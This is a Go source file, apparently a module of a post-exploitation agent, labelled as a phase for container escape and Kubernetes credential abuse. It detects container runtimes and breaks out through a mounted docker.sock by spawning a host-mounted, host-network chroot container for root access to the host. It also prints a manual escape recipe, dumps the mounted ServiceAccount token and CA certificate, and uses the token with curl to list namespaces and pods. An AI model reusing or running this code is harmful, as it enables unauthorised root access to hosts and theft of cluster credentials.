//go:build !windows

package main

// Phase 10 — Container Escape & K8s Credential Abuse
//   - container-check: detect Docker/K8s/containerd environment
//   - docker-escape:   escape via mounted docker.sock to host FS
//   - k8s-sa-token:    dump mounted ServiceAccount JWT + CA cert
//   - k8s-enum-pods:   list pods via SA token against in-cluster API

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// containerCheck detects container runtime indicators.
func containerCheck() (string, string) {
	var lines []string

	if _, err := os.Stat("/.dockerenv"); err == nil {
		lines = append(lines, "[+] DOCKER     /.dockerenv present")
	}

	if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
		s := string(data)
		if strings.Contains(s, "docker") {
			lines = append(lines, "[+] DOCKER     found in /proc/1/cgroup")
		}
		if strings.Contains(s, "kubepods") {
			lines = append(lines, "[+] K8S        kubepods in /proc/1/cgroup")
		}
		if strings.Contains(s, "containerd") {
			lines = append(lines, "[+] CONTAINERD containerd in /proc/1/cgroup")
		}
		if strings.Contains(s, "lxc") {
			lines = append(lines, "[+] LXC        lxc in /proc/1/cgroup")
		}
	}

	if _, err := os.Stat("/var/run/docker.sock"); err == nil {
		lines = append(lines, "[!] DOCKER_SOCK /var/run/docker.sock accessible — potential escape vector")
	}

	if _, err := os.Stat("/var/run/secrets/kubernetes.io/serviceaccount/token"); err == nil {
		lines = append(lines, "[!] K8S_SA_TOKEN mounted — run k8s-sa-token to dump")
	}

	if data, err := os.ReadFile("/proc/1/cmdline"); err == nil {
		cmd := strings.ReplaceAll(string(data), "\x00", " ")
		lines = append(lines, fmt.Sprintf("    PID_1: %s", strings.TrimSpace(cmd)))
	}

	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "CapEff:") {
				lines = append(lines, fmt.Sprintf("    %s", strings.TrimSpace(line)))
				break
			}
		}
	}

	// Writable host paths (mounted volumes)
	suspectPaths := []string{"/host", "/rootfs", "/hostfs", "/proc/sysrq-trigger"}
	for _, p := range suspectPaths {
		if _, err := os.Stat(p); err == nil {
			lines = append(lines, fmt.Sprintf("[!] HOST_MOUNT  %s accessible", p))
		}
	}

	if len(lines) == 0 {
		return "Container check: no container indicators detected (bare-metal or VM likely)", "completed"
	}
	return "=== Container Environment Indicators ===\n" + strings.Join(lines, "\n"), "completed"
}

// dockerEscape attempts container breakout via an accessible /var/run/docker.sock.
func dockerEscape(arg string) (string, string) {
	if _, err := os.Stat("/var/run/docker.sock"); err != nil {
		return "docker.sock not found — not in a Docker container or socket not mounted", "failed"
	}

	// Locate docker binary
	dockerBin := ""
	for _, p := range []string{"/usr/bin/docker", "/usr/local/bin/docker"} {
		if _, err := os.Stat(p); err == nil {
			dockerBin = p
			break
		}
	}
	if dockerBin == "" {
		if out, _ := executeShell("which docker 2>/dev/null"); strings.TrimSpace(out) != "" {
			dockerBin = strings.TrimSpace(out)
		}
	}

	var b strings.Builder
	b.WriteString("=== Docker Escape ===\n")
	b.WriteString("Socket: /var/run/docker.sock accessible\n")

	if dockerBin == "" {
		// Fallback: probe via curl unix-socket
		curlOut, _ := executeShell(`curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1 | head -c 600`)
		b.WriteString("Docker binary: not found — attempting curl API probe\n\n")
		b.WriteString("API /info:\n")
		b.WriteString(curlOut)
		b.WriteString("\n\n[*] To escape manually:\n")
		b.WriteString("  1. Upload a static docker binary\n")
		b.WriteString("  2. docker run --rm -v /:/host --net=host --pid=host alpine chroot /host /bin/bash\n")
		return b.String(), "completed"
	}

	b.WriteString(fmt.Sprintf("Docker binary: %s\n", dockerBin))

	listOut, _ := executeShell(fmt.Sprintf("%s ps --format '{{.ID}}  {{.Image}}  {{.Status}}'", dockerBin))
	b.WriteString(fmt.Sprintf("\nRunning containers:\n%s\n", listOut))

	// Attempt privileged container spawn with host bind-mount
	escapeCmd := fmt.Sprintf("%s run --rm -v /:/host --net=host --pid=host alpine chroot /host id 2>&1", dockerBin)
	escapeOut, escapeErr := executeShell(escapeCmd)
	b.WriteString(fmt.Sprintf("\nEscape attempt (chroot /host id):\n%s\n", escapeOut))

	if escapeErr == nil && (strings.Contains(escapeOut, "uid=0") || strings.Contains(escapeOut, "root")) {
		b.WriteString("\n[+] ESCAPE SUCCESSFUL — host root filesystem accessible\n")
		b.WriteString(fmt.Sprintf("Interactive: %s run --rm -v /:/host --net=host --pid=host alpine chroot /host /bin/sh\n", dockerBin))
		return b.String(), "completed"
	}

	b.WriteString("\n[-] Privileged container spawn blocked (AppArmor/seccomp or non-root)\n")
	b.WriteString("Try: deploy inside a privileged container or find a privileged container to exec into\n")
	return b.String(), "completed"
}

// k8sSAToken reads the mounted Kubernetes ServiceAccount credentials.
func k8sSAToken() (string, string) {
	base := "/var/run/secrets/kubernetes.io/serviceaccount"
	tokenPath := filepath.Join(base, "token")

	token, err := os.ReadFile(tokenPath)
	if err != nil {
		return "K8s SA token not found at " + tokenPath + " — not running inside Kubernetes", "failed"
	}

	var b strings.Builder
	b.WriteString("=== Kubernetes ServiceAccount Credentials ===\n\n")
	b.WriteString(fmt.Sprintf("TOKEN:\n%s\n\n", strings.TrimSpace(string(token))))

	if ns, err := os.ReadFile(filepath.Join(base, "namespace")); err == nil {
		b.WriteString(fmt.Sprintf("NAMESPACE: %s\n", strings.TrimSpace(string(ns))))
	}
	if ca, err := os.ReadFile(filepath.Join(base, "ca.crt")); err == nil {
		preview := string(ca)
		if len(preview) > 300 {
			preview = preview[:300] + "...(truncated)"
		}
		b.WriteString(fmt.Sprintf("\nCA.CRT (preview):\n%s\n", preview))
	}

	apiHost := os.Getenv("KUBERNETES_SERVICE_HOST")
	apiPort := os.Getenv("KUBERNETES_SERVICE_PORT")
	if apiHost != "" && apiPort != "" {
		b.WriteString(fmt.Sprintf("\nK8S API: https://%s:%s\n", apiHost, apiPort))

		selfURL := fmt.Sprintf("https://%s:%s/api/v1/namespaces", apiHost, apiPort)
		probeCmd := fmt.Sprintf(`curl -sk -H "Authorization: Bearer %s" %s 2>&1 | head -c 800`,
			strings.TrimSpace(string(token)), selfURL)
		if out, err := executeShell(probeCmd); err == nil {
			b.WriteString(fmt.Sprintf("\nAPI /namespaces probe:\n%s\n", out))
		}
	}

	return b.String(), "completed"
}

// k8sEnumPods lists pods in the current namespace via mounted SA token.
func k8sEnumPods() (string, string) {
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	nsPath := "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

	token, err := os.ReadFile(tokenPath)
	if err != nil {
		return "No K8s SA token — not in a K8s pod or token not mounted", "failed"
	}

	ns := "default"
	if data, err := os.ReadFile(nsPath); err == nil {
		ns = strings.TrimSpace(string(data))
	}

	apiHost := os.Getenv("KUBERNETES_SERVICE_HOST")
	apiPort := os.Getenv("KUBERNETES_SERVICE_PORT_HTTPS")
	if apiPort == "" {
		apiPort = os.Getenv("KUBERNETES_SERVICE_PORT")
	}
	if apiHost == "" {
		return "KUBERNETES_SERVICE_HOST not set — not in K8s or env stripped", "failed"
	}

	url := fmt.Sprintf("https://%s:%s/api/v1/namespaces/%s/pods", apiHost, apiPort, ns)
	cmd := fmt.Sprintf(`curl -sk -H "Authorization: Bearer %s" "%s" 2>&1 | head -c 4000`,
		strings.TrimSpace(string(token)), url)

	out, err := executeShell(cmd)
	if err != nil {
		return "K8s API query failed: " + err.Error(), "failed"
	}
	return fmt.Sprintf("Namespace: %s\nAPI: %s\n\n%s", ns, url, out), "completed"
}
